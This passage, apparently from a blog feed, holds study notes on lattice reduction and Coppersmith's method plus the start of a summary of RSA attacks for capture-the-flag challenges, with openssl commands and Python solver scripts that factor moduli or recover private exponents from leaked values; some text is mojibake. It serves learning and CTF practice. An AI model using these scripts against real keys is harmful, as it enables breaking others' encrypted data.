$|x_{0}|&lt;X,|y_{0}|&lt;Y$ and $F(x_{0},y_{0})\equiv 0(mod\ M)$, one has $F_{1}(x_{0},y_{0})=F_{2}(x_{0},y_{0})=0$ over Z.</M^{\frac{1}{d}-\epsilon}$></p><h3 id="4-3-Bivariate-Integer-Polynomials"><a href="#4-3-Bivariate-Integer-Polynomials" class="headerlink" title="4.3    Bivariate Integer Polynomials"></a>4.3    Bivariate Integer Polynomials</h3><p><strong>Theorem 4.3.1.</strong> Let $F(x,y)\in Z[x,y]$ and let $d\in N$ be such that $deg_{x}(F(x,y)),deg_{y}(F(x,y))\leq d$. Write</p><script type="math/tex; mode=display">F(x,y)=\sum_{0\leq i,j\leq d}F_{i,j}x^{i}y^{j}</script><p>For $X,Y\in N$, we define</p><script type="math/tex; mode=display">W=max_{0\leq i,j\leq d}|F_{i,j}|X^{i}Y^{j}</script><p>If $XY&lt;W^{\frac{2}{3d}}$ then there is an algorithm that takes as input F(x,y),X,Y, runs in time (bit operations) bounded by a polynomial in log(W) and $2^{d}$, and outputs all pairs $(x_{0},y_{0})\in Z^{2}$ such that $F(x_{0},y_{0})=0,|x_0|\leq X,|y_0|\leq Y$.</p><h3 id="4-4-Some-Applications-of-Coppersmithâ€™s-method"><a href="#4-4-Some-Applications-of-Coppersmithâ€™s-method" class="headerlink" title="4.4    Some Applications of Coppersmithâ€™s method"></a>4.4    Some Applications of Coppersmithâ€™s method</h3><h4 id="4-4-1-Fixed-Padding-Schemes-in-RSA"><a href="#4-4-1-Fixed-Padding-Schemes-in-RSA" class="headerlink" title="4.4.1     Fixed Padding Schemes in RSA"></a>4.4.1     Fixed Padding Schemes in RSA</h4><p>It is necessary to use padding schemes for RSA encryption and one simple proposal for k-bit RSA moduli is to take a kâ€™ bit message and pad it by putting (k-kâ€™-1) ones to the left hand side of it. This padding scheme is sometimes called <strong>fixed pattern padding</strong>.</p><script type="math/tex; mode=display">F(x)=(2^{k}-2^{k'}+x)^{e}-c\equiv 0(mod\ N)</script><p>Then if $|x|&lt;\frac{1}{2}N^{\frac{1}{e}}(kâ€™&lt;\frac{k}{e}-1)$, Coppersmithâ€™s method can solve it in polynomial time.</p><h4 id="4-4-2-Factoring-N-pq-with-Partial-Knowledge-of-p"><a href="#4-4-2-Factoring-N-pq-with-Partial-Knowledge-of-p" class="headerlink" title="4.4.2    Factoring N = pq with Partial Knowledge of p"></a>4.4.2    Factoring N = pq with Partial Knowledge of p</h4><p>Given an approximation $\tilde{p}$ to p such that $p=\tilde{p}+x_{0}$ where $|x_{0}|&lt;X$. The polynomial $F(x)=(x+\tilde{p})$ has a small solution module p. The problem is that we donâ€™t know p, but we do know a multiple of p (i.e., N). The idea is to form a lattice corresponding to polynomials that have a small root modulo p and to apply Coppersmithâ€™s method to find this root $x_0$.</p><p><strong>Theorem 4.4.1.</strong> Let N=pq with p&lt;q&lt;2p. Let $0&lt;\epsilon &lt;\frac{1}{4}$, and suppose $\tilde{p}\in N$ is such that $|p-\tilde{p}|\leq \frac{1}{2\sqrt{2}}N^{\frac{1}{4}-\epsilon}$. Then given N and $\tilde{p}$ one can factor N in time polynomial in log(N) and $\frac{1}{\epsilon}$.</p><p>By constructing lattice whose basis including $NX^{i},X^{i}F(X)$.</p><h4 id="4-4-3-Factoring-p-r-q"><a href="#4-4-3-Factoring-p-r-q" class="headerlink" title="4.4.3    Factoring $p^{r}q$"></a>4.4.3    Factoring $p^{r}q$</h4><p><strong>Example 4.4.2. (Takagi-RSA)</strong> Let $N=p^{r}q$ where p and q are primes and r&gt;1. Suppose the public exponent e in RSA is small. One can compute $c^{d}(mod\ N)$ as follows. Let $d_{p}\equiv d(mod\ p-1)$ and $d_{q}\equiv d(mod\ q-1)$. One first computes $m_{p}=c^{d_{p}}(mod\ p)$ and $m_{q}=c^{d_{q}}(mod\ q)$.</p><p>Then we can determine $m(mod\ p^{r})$ from $m_p$ by using Hensel lifting. If we have determined $m_{i}\equiv m    (mod\ p^{i})$ then we lift to a solution modulo $p^{i+1}$ by writing $m_{i+1}=m_{i}+kp^{i}$, where k is a variable. Then</p><script type="math/tex; mode=display">m_{i+1}^{e}=(m_{i}+kp^{i})^{e}\equiv m_{i}^{e}+ekp^{i}m_{i}^{e-1}\equiv c(mod\ p^{i+1})</script><p>gives $k\ mod(p^{i+1})$. The equation above is only efficient when e is small. If e is large then the Hensel lifting stage is no faster than just computing $c^{d(mod\ \varphi(p^{r}))}(mod\ p^{r})$ directly.</p><p>Coppersmithâ€™s method can be used to factor integers of the form $N=p^{r}q$ when r is large. If one knows r and an approximation $\tilde{p}$ to p then there is a small root of the polynomial equation</p><script type="math/tex; mode=display">F(x)=(\tilde{p}+x)^{r}\equiv 0(mod\ p^{r})</script><p>It is shown that if $r\geq log(p)$ then the algorithm runs in polynomial-time.</p></c_{1}(d)\cdot></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lattice-Learning-1</title>
      <link href="/2020/02/29/Lattice-Learning-1/"/>
      <url>/2020/02/29/Lattice-Learning-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-1-Lattice"><a href="#Chapter-1-Lattice" class="headerlink" title="Chapter 1    Lattice"></a>Chapter 1    Lattice</h2><h3 id="1-1-Basic-Notions-on-Lattices"><a href="#1-1-Basic-Notions-on-Lattices" class="headerlink" title="1.1    Basic Notions on Lattices"></a>1.1    Basic Notions on Lattices</h3><p><strong>Definition 1.1.1.</strong> Let $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ be a linearly independent set of (row) vectors in $R^{m}(m\geq n)$. The lattice generated by $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ is the set</p><script type="math/tex; mode=display">L=\{\sum^{n}_{i=1}l_{i}\underline{b}_{i}:l_{i}\in Z\}</script><p>of integer linear combinations of the $\underline{b}_{i}$. The vectors $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ are called a lattice basis. The lattice rank is n and the lattice dimension is m. If n = m then L is said to be a full rank lattice.</p><p><strong>Lemma 1.1.2.</strong> Two $a\times b$ matrices B and Bâ€™ generate the same lattice L if and only if B and Bâ€™ are related by a unimodular matrix, i.e., $Bâ€™=UB$ where U is an $n\times n$ matrix with integer entries and determinant Â±1.</p><p><strong>Definition 1.1.3.</strong> Let L be a lattice in $R^{m}$ of rank n with basis matrix B. The <strong>Gram matrix</strong> of B is $BB^{T}$. This is an $n\times n$ matrix whose (i, j)th entry is $&lt;\underline{b}_{i},\underline{b}_{j}&gt;$.</p><p><strong>Lemma 1.1.4.</strong> Let L be a lattice in $R^{m}$ of rank n with basis matrix B. Then $det(L)=\sqrt{det(BB^{T})}$</p><p><strong>Definition 1.1.5.</strong> Let $L\subset R^{m}$ be a lattice of rank n. The <strong>successive minima</strong> of L are $\lambda_{1},â€¦,\lambda_{n}\in R$ such that, for $1\leq i\leq n,\lambda_{i}$ is minimal such that there exist i linearly independent vectors $\underline{v}_{1},â€¦,\underline{v}_{i}\in L$ with $\left|\underline{v}_{j}\right|\leq \lambda_{i}$ for $1\leq j\leq i$.It follows that $0&lt;\lambda_{1}&lt;\lambda_{2}&lt;â€¦&lt;\lambda_{n}$. Sometimes there exists a basis consisting of vectors whose lengths are equal to the successive minima, but not always.</p><h3 id="1-2-The-Hermite-and-Minkowski-Bounds"><a href="#1-2-The-Hermite-and-Minkowski-Bounds" class="headerlink" title="1.2    The Hermite and Minkowski Bounds"></a>1.2    The Hermite and Minkowski Bounds</h3><p><strong>Theorem 1.2.1.</strong> (Minkowski) Let L be a lattice of rank n in $R^{n}$ with successive minima $\lambda_{1},â€¦,\lambda_{n}$ for the Euclidean norm. Then</p><script type="math/tex; mode=display">(\prod^{n}_{i=1}\lambda_{i})^{\frac{1}{n}}<\sqrt{n}det(L)^{\frac{1}{n}}</script><h3 id="1-3-Computational-Problems-in-Lattices"><a href="#1-3-Computational-Problems-in-Lattices" class="headerlink" title="1.3    Computational Problems in Lattices"></a>1.3    Computational Problems in Lattices</h3><p><strong>Definition 1.3.1.</strong> Let L be a lattice in $Z^{m}$</p><ol><li>The shortest vector problem (SVP) is the computational problem: given a basis matrix B for L, compute a non-zero vector $\underline{v}\in L$ such that $\left|\underline{v}\right|$ is minimal (i.e., $\left|\underline{v}\right|=\lambda_{1}$).</li><li>The closest vector problem (CVP) is the computational problem: given a basis matrix B for L and a vector $\underline{\omega}\in Q^{m}$ (one can work with high-precision approximations in $R^{m}$, but this is essentially still working in $Q^{m}$), compute $\underline{v}\in L$ such that $\left|\underline{\omega}-\underline{v}\right|$ is minimal.</li><li>Others</li></ol><h2 id="Chapter-2-Lattice-Basis-Reduction"><a href="#Chapter-2-Lattice-Basis-Reduction" class="headerlink" title="Chapter 2    Lattice Basis Reduction"></a>Chapter 2    Lattice Basis Reduction</h2><h3 id="2-1-LLL-Reduced-Lattice-Bases"><a href="#2-1-LLL-Reduced-Lattice-Bases" class="headerlink" title="2.1    LLL-Reduced Lattice Bases"></a>2.1    LLL-Reduced Lattice Bases</h3><blockquote><p><strong>The Goal of Lattice Reduction</strong></p><p>Obtain a basis B in which the Gram-Schmidt vectors are not decreasing too quickly.</p><p>This roughly means that the basis vectors are somewhat orthogonal to each other.</p></blockquote><p><strong>Definition 2.1.1.</strong> Let $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ be linearly independent in $R^{m}$ and let $\{\tilde{\underline{b}_{1}},â€¦,\tilde{\underline{b}_{n}\}}$ be the Gram-Schmidt orthogonalisation. Let $\mu_{i,j}=\frac{&lt;\underline{b}_{i},\tilde{\underline{b}_{j}}&gt;}{\left|\tilde{\underline{b}_{j}}\right|^{2}}$ for $1\leq j&lt;i\leq n$ be the coefficients from the Gram-Schmidt process. Fix $\frac{1}{4}&lt;\delta&lt;1$. The (ordered) basis is <strong>LLL-Reduced</strong> (with factor $\delta$) if the following conditions hold:</p><ul><li>(Size reduced) All $|\mu_{i,j}|\leq 0.5$.</li><li>(LovÂ´asz condition) $(\delta-\mu_{i+1,i}^{2})\left|\tilde{\underline{b}_{i}}\right|^{2}\leq \left|\tilde{\underline{b}_{i+1}}\right|^{2}$ (It is traditional to choose $\delta=\frac{3}{4}$ in this case).</li></ul><script type="math/tex; mode=display">B=\left[ \begin{matrix}   1 & 0 & ... & ... & 0 \\   \mu_{2,1} & 1 & 0 & ... & 0 \\   \mu_{3,1} & \mu_{3,2} & 1 & ... & 0 \\   ... & ... & ... & ... & ... \\   0 & 0 & 0 & ... & 1  \end{matrix} \right]\left[ \begin{matrix}   \tilde{\underline{b}_{1}} \\   \tilde{\underline{b}_{2}} \\   ... \\   ... \\   \tilde{\underline{b}_{n}}  \end{matrix} \right]</script><p>Size reduced can be easily solved by Gauss elimination method while LovÂ´asz condition by swap $b_{i}$ and $b_{j}$.</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-1/image-20200227233301471.png" alt></p><h3 id="2-2-Generic-Problems-that-Fall-under-the-Scope-of-Lattice-Reduction"><a href="#2-2-Generic-Problems-that-Fall-under-the-Scope-of-Lattice-Reduction" class="headerlink" title="2.2    Generic Problems that Fall under the Scope of Lattice Reduction"></a>2.2    Generic Problems that Fall under the Scope of Lattice Reduction</h3><h4 id="2-2-1-Pre-knowledge"><a href="#2-2-1-Pre-knowledge" class="headerlink" title="2.2.1    Pre-knowledge"></a>2.2.1    Pre-knowledge</h4><p><strong>Lemma 2.2.1.</strong>  Assume $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ is a family of vectors with integer coefficients <em>in the</em> t-dimensional space, with t&lt;n. Let M denote an upper bound for the absolute values of all coefficients of the various $\underline{b}_{i}s$. There exists an integer relation</p><script type="math/tex; mode=display">\sum_{i=1}^{n}\lambda_{i}\underline{b}_{i}=0</script><p>such that $max|\lambda_{i}|\leq B$ï¼Œwhere B is given by</p><script type="math/tex; mode=display">logB=t\frac{logM+logn+1}{n-t}</script><h4 id="2-2-2-Ordinary-Case"><a href="#2-2-2-Ordinary-Case" class="headerlink" title="2.2.2    Ordinary Case"></a>2.2.2    Ordinary Case</h4><p>Given a family of integer vectors $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$, there exists an integer relation</p><script type="math/tex; mode=display">\sum_{i=1}^{n}\alpha_{i}\underline{b}_{i}=0</script><p>We construct the lattice given by the rows of the following matrix:</p><script type="math/tex; mode=display">\left[  \begin{matrix}  K\underline{b}_{1} & 1 & 0 & ... & 0\\  K\underline{b}_{2} & 0 & 1 & ... & 0\\  ... & ... & ... & ... & ...\\  K\underline{b}_{n} & 0 & 0 & ... & 1  \end{matrix}\right]</script><p>where K is a well chosen constant.</p><p>K should be large enough to ensure that the first vector of the reduced basis has zero components in its upper part corresponding to the first t coordinates, where t is the dimension of the $\underline{b}_{i}$.</p><h4 id="2-2-3-Modular-Case"><a href="#2-2-3-Modular-Case" class="headerlink" title="2.2.3    Modular Case"></a>2.2.3    Modular Case</h4><p>We now discuss the case of <strong>mod m</strong> numbers. The basic problem is still how one can force lattice reduction to deal with modular relations. The matrix we construct is:</p><script type="math/tex; mode=display">\left[  \begin{matrix}  K\underline{b}_{1} & 1 & 0 & ... & 0\\  K\underline{b}_{2} & 0 & 1 & ... & 0\\  ... & ... & ... & ... & ...\\  K\underline{b}_{n} & 0 & 0 & ... & 1\\  KmI & 0 & 0 & ... & 0  \end{matrix}\right]</script><p>where I is a t-dimensional <strong>identity matrix</strong>, with t the dimension of the $\underline{b}_{i}$. It is clear that the added identity matrix force reduction of numbers module m.</p><h4 id="2-2-4-Knapsack-problems"><a href="#2-2-4-Knapsack-problems" class="headerlink" title="2.2.4     Knapsack problems"></a>2.2.4     Knapsack problems</h4><p>In cryptographic scenarios, we know that such a relation exists between the given elements of the knapsack $a_{1}, â€¦, a_{n}$ and the target sum $s=\sum^{n}_{i=1}\epsilon_{i}a_{i}.(\epsilon_{i}\in\{0,1\})$</p><p>The euclidean size of this relation is $\sqrt{\alpha n }$, where $\alpha$ is the proportion of ones in the relations. Moreover, $\{\epsilon_{i}\}$ can be seen as random, so we will set $\alpha=\frac{1}{2}$ here.</p><p>Subset sum problem can be converted into SVP and easily solved by LLL algorithm with the following matrix:</p><script type="math/tex; mode=display">\left[\begin{matrix}Ka_{1} & 1 & 0 & ... & 0\\Ka_{2} & 0 & 1 & ... & 0\\... & ... & ... & ... & ...\\Ka_{n} & 0 & 0 & ... & 1\\Kc & \frac{1}{2} & \frac{1}{2} & ... & \frac{1}{2}\\\end{matrix}\right]</script><p>The reason for using $\frac{1}{2}$ rather than 0 in the last row vector, is that we want the correct vector to be as short as possible so that we can find it by solving SVP. </p><p>But the density of the knapsack should be low enough:</p><script type="math/tex; mode=display">d=\frac{n}{log_{2}(max_{i}a_{i})}.</script><p>It is said that â€œalmost allâ€ subset sum problems with d(a)&lt;0.645 can be solved as SVP by LLL algorithm, but the difficulty of solving is also related to size of n.</p><h3 id="2-3-Examples"><a href="#2-3-Examples" class="headerlink" title="2.3    Examples"></a>2.3    Examples</h3><h4 id="2-3-1-Cryptanalysis-of-Knuthâ€™s-truncated-LCG"><a href="#2-3-1-Cryptanalysis-of-Knuthâ€™s-truncated-LCG" class="headerlink" title="2.3.1    Cryptanalysis of Knuthâ€™s truncated LCG"></a>2.3.1    Cryptanalysis of Knuthâ€™s truncated LCG</h4><p>LCG is defined by $x_{i+1}=(ax_{i}+b)$ mod m.</p><p>In case all the bits of the successive $x_{i}s$ are announced, the sequence becomes exactly predictable even if the modulus, the multiplier and the increment are not known. This is a result of J. Boyar.</p><p>The version we introduce(Knuth) extends the initial method to the case where a small portion of the lower bits are discarded. Moreover, our results cover the case where <em>m</em> and <em>a</em> are unknown parameters.</p><p><strong>First step of the algorithm</strong></p><p>We let $\nu$ be the number of bits of the modules m. If we output a proportion $\alpha$ of bits, we can write</p><script type="math/tex; mode=display">x_{i}=2^{\beta\nu}y_{i}+z_{i}</script><p>where $\beta=1-\alpha,y_{i}$ consists of the leading bits of $x_{i}$ and $z_{i}$ of the trailing bits.</p><p>Our algorithm is more accurately described as a sequence of different algorithms depending on a parameter <em>t</em>.</p><p>We let $V_{i}$ be the element of $Z^{t}$ defined by</p><script type="math/tex; mode=display">V_{i}=(y_{i+1}-y_{i},y_{i+2}-y_{i+1},...,y_{i+t}-y_{i+t-1})</script><p>Applying the techniques of  section 2.2.2, we can find an linear relation</p><script type="math/tex; mode=display">\sum^{n}_{i=1}\lambda_{i}V_{i}=0</script><p>whose coefficients are moderate integers. More precisely, it follows from lemma 2.2.1 that such a relation exists with $|\lambda_{i}|\leq B$ with</p><script type="math/tex; mode=display">logB=t\frac{log(2^{\alpha\nu})+logn+1}{n-t}=t\frac{\alpha\nu+logn+1}{n-t}</script><p>We now consider the (unknown) vectors $W_{i}$ defined by</p><script type="math/tex; mode=display">W_{i}=(x_{i+1}-x_{i},x_{i+2}-x_{i+1},...,x_{i+t}-x_{i+t-1})</script><p>and we let</p><script type="math/tex; mode=display">U=\sum^{n}_{i=1}\lambda_{i}W_{i}</script><p>$\because x_{i+j+1}-x_{i+j}=a^{j}(x_{i+1}-x_{i})\ mod\ m$ï¼Œ$\therefore$ all vectors $W_{i}s$ belong to the lattice L generated by the rows of the following matrix</p><script type="math/tex; mode=display">\left[\begin{matrix}1 & a & a^{2} & ... & a^{t-1}\\0 & m & 0 & ... & 0\\0 & 0 & m & ... & 0\\... & ... & ... & ... & ...\\0 & 0 & 0 & ... & m\end{matrix}\right]</script><p>It is easily seen that $det(L)=m^{t-1}$ï¼Œhence the expected size of short vectors is around $tm^{\frac{t-1}{t}}$(Minkowski Theorem). Since U belongs to L and is of size $O(m^{\beta+\delta})$, for any $\delta&gt;0$, (can be easily proved by $\sum^{n}_{i=1}\lambda_{i}V_{i}=0$), U is unusually short as soon as $\beta&lt;\frac{t-1}{t}$, which means $\alpha&gt;\frac{1}{t}$. Such a vector has to be <strong>zero</strong>. ($\lambda_{i}s$ were produced by $V_{i}s$ and LLL algorithm) </p><p>Now we have U=0, and we can write U as</p><script type="math/tex; mode=display">\sum^{n}_{i=1}\lambda_{i}W_{i}=(x_{1}-x_{0})\sum^{n}_{i=1}\lambda_{i}a^{i}\ mod\ m</script><p>As soon as $x_{1}-x_{0}$ is prime to m(unless $x_{0}$ is a bad seed), we get the polynomial $P(x)=\sum\lambda_{i}x^{i}$ vanishes at a module m. This is precisely what we want from the first step.</p><p><strong>Second step of the algorithm</strong></p><p>After applying part 1 several times, we come out with a sequence $P_{1},â€¦,P_{r}$ of polynomials of degree n, each of these vanishing at a module m. Now, if we identify polynomials of degree n with elements of $Z^{n+1}$(by coefficients), we see that the polynomials that <strong>vanish at a module m</strong> form a lattice L generated by the sequence</p><script type="math/tex; mode=display">Q_{i}(x)=x^{i}-a^{i}(1\leq i\leq n)</script><p>which all vanish at a module m and by the constant polynomial m. The basis s generated by the row vectors below</p><script type="math/tex; mode=display">\left[\begin{matrix}m & 0 & 0 & ... & 0\\-a & 1 & 0 & ... & 0\\-a^{2} & 0 & 1 & ... & 0\\... & ... & ... & ... & ...\\-a^{n} & 0 & 0 & ... & 1\end{matrix}\right]</script><p>which $det(L)=m$. Now, if the $P_{i}s$ generate the lattice, then one can apply lattice reduction, output a basis of the lattice and <strong>compute the determinant</strong>. Based on experiments, we claim that such an algorithm actually discloses m. </p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-1/Snipaste_2020-04-08_23-23-15.png" alt></p><p>We finally say a word on recovering a from m. We twist the lattice L generated by $P_{i}s$ and constant m by multiplying all coefficients of $degree\geq 2$ by a large constant K and we apply lattice reduction. We usually let $K\geq m2^\frac{n}{2}$, then the sublattice of L generated by m and x-a will be disclosed: this is because the shortest two vectors of L is of size m and any polynomial of the lattice with $degree\geq 2$ exceeds this size by a factor $\geq 2^{\frac{n}{2}}$. So we can solve polynomial with $degree\leq 2$ to get a. </p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary of Crypto in CTF(RSA)</title>
      <link href="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/"/>
      <url>/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</url>
      
        <content type="html"><![CDATA[<h3 id="RSA-How-to-Use-openssl"><a href="#RSA-How-to-Use-openssl" class="headerlink" title="RSA - How to Use openssl"></a>RSA - How to Use openssl</h3><p>Given <em>flag.enc</em>, <em>pubkey.pem/pub.key</em></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br></pre></td></tr></table></figure><p>Then we get (e, n), after getting d: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">c = bytes_to_long(open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="RSA-Given-e-d-n"><a href="#RSA-Given-e-d-n" class="headerlink" title="RSA - Given (e, d, (n))"></a>RSA - Given (e, d, (n))</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><ol><li>[Initialize] Set $k\leftarrow d\cdot e-1$</li><li>[Try a random g] Choose random small primes g = 2, 3, 5, 7, â€¦</li><li>[Next k] If $2\mid k,k\leftarrow\frac{k}{2}$ and $x\leftarrow g^k$ mod n, else go to step 2 (g $\leftarrow$ next_prime(g))</li><li>[Finish?] If $y\leftarrow gcd(x-1,n)\ mod\ n&gt;1,p\leftarrow y,q\leftarrow n//y$, quit. Else go to step 3.</li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Factorize</span><span class="params">(n, e, d)</span>:</span></span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = e * d - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            p = int(gcd(pow(g, k, n) - <span class="number">1</span>, n)) % n</span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">        g = int(next_prime(g))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    d = </span><br><span class="line">    print(Factorize(n, e, d))</span><br></pre></td></tr></table></figure><h4 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h4><p>Given only (e, d)  - [NCTF2019] babyRSA</p><h3 id="RSA-Given-e-dp-n"><a href="#RSA-Given-e-dp-n" class="headerlink" title="RSA - Given (e, dp, n)"></a>RSA - Given (e, dp, n)</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><script type="math/tex; mode=display">Known(e,dp,n),assume\ dp\equiv d(mod\ (p-1))</script><hr><p>$\because dp\cdot e\equiv d\cdot e\equiv 1(mod\ (p-1))$</p><p>$\therefore dp\cdot e-1=k\cdot (p-1)$</p><p>$\because dp\cdot e\equiv d\cdot e\equiv 1(mod\ (p-1))$</p><p>$\therefore dp\cdot e-1=k\cdot (p-1)$</p><p>$\therefore (dp\cdot e-1)\cdot d\cdot e=kâ€™\cdot (p-1),\quad kâ€™=k\cdot d\cdot e$</p><p>$\Leftrightarrow d*e=-kâ€™\cdot (p-1)+dp\cdot e\cdot d\cdot e\equiv 1(mod\ \varphi(n))\Leftrightarrow -kâ€™\cdot (p-1)+dp\cdot e\equiv 1(mod\ \varphi(n))$</p><p>$\therefore k_{1}\cdot (p-1)+dp\cdot e-1=k_{2}\cdot (p-1)\cdot (q-1)\Leftrightarrow (p-1)\cdot (k_{2}\cdot (q-1)-k_{1})+1=dp\cdot e$</p><p>$\because dp&lt;p-1\quad \therefore (k_{2}\cdot (q-1)-k_{1})\in (0, e)$</p><p>$\therefore$éå†i in range(1, e)ï¼Œå½“åŒæ—¶æ»¡è¶³</p><p>$(dp\cdot e-1)\%i==0$å’Œ$n\%((dp\cdot e-1)//i+1)==0æ—¶$ï¼ŒNæˆåŠŸåˆ†è§£.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(e, dp, n)</span>:</span></span><br><span class="line">    _ = dp * e - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _ % i:</span><br><span class="line">            p = _ // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> n % p:</span><br><span class="line">                q = n // p</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = int(gmpy2.invert(e, phi))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    e = int(input(<span class="string">"e = "</span>))</span><br><span class="line">    dp = int(input(<span class="string">"dp = "</span>))</span><br><span class="line">    n = int(input(<span class="string">"n = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = decrypt(e, dp, n)</span><br><span class="line">    print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="RSA-Given-p-q-dp-dq"><a href="#RSA-Given-p-q-dp-dq" class="headerlink" title="RSA - Given (p, q, dp, dq)"></a>RSA - Given (p, q, dp, dq)</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><script type="math/tex; mode=display">Known(p,q,dp,dq),assume\ dp\equiv d(mod\ (p-1)),dq\equiv d(mod\ (q-1))</script><hr><p>$d\equiv dp(mod\ (p-1)),d\equiv dq(mod\ (q-1))\rightarrow ext_CRT\ (\because gcd(p-1,q-1)$ä¸ä¸€å®šç­‰äº1)</p><p>$\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1)$</p><p>$\Leftrightarrow k_{1}\frac{p-1}{gcd(p-1,q-1)}=\frac{dq-dp}{gcd(p-1,q-1)}+k_{2}\frac{q-1}{gcd(p-1,q-1)}$</p><p>$\Rightarrow k_{1}\frac{p-1}{gcd(p-1,q-1)}\equiv\frac{dq-dp}{gcd(p-1,q-1)}(mod\ \frac{q-1}{gcd(p-1,q-1)})$</p><p>$\Leftrightarrow k_{1}\equiv invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{dq-dp}{gcd(p-1,q-1)}(mod\ \frac{q-1}{gcd(p-1,q-1)})$</p><p>å°†$k_{1}=k_{3}\frac{q-1}{gcd(p-1,q-1)}+invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{dq-dp}{gcd(p-1,q-1)}$ä»£å…¥$d=k_{1}(p-1)+dp$</p><p>$d=k_{3}\frac{(p-1)(q-1)}{gcd(p-1,q-1)}+invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{(dq-dp)(p-1)}{gcd(p-1,q-1)}+dp$</p><p>$\Rightarrow d\equiv invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{(dq-dp)(p-1)}{gcd(p-1,q-1)}+dp(mod\ 